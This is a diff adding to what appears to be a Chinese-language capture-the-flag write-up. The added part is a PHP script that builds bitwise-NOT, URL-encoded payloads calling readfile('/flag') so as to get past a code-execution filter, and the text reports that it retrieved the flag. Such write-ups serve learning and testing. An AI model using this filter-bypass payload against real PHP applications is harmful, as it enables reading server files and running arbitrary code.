@@ -202,3 +202,26 @@ for($i=0; $i<strlen($str); $i++){
 echo "(~'$payload')();";
 ?>
 ```
+成功获得phpinfo界面
+最终exp：
+```php
+<?php  
+$func = "readfile";  
+$arg = "/flag";  
+$payload = "";  
+function encode_str($str)  
+{  
+    $res="";  
+    for ($i = 0; $i < strlen($str); $i++) {  
+        $res .= urlencode(~$str[$i]);  
+    }  
+    return $res;  
+}  
+$function = encode_str($func);  
+$argc = encode_str($arg);  
+  
+echo "(~'$function')(~'$argc');";  
+  
+?>
+```
+利用脚本生成的payload成功获得flag
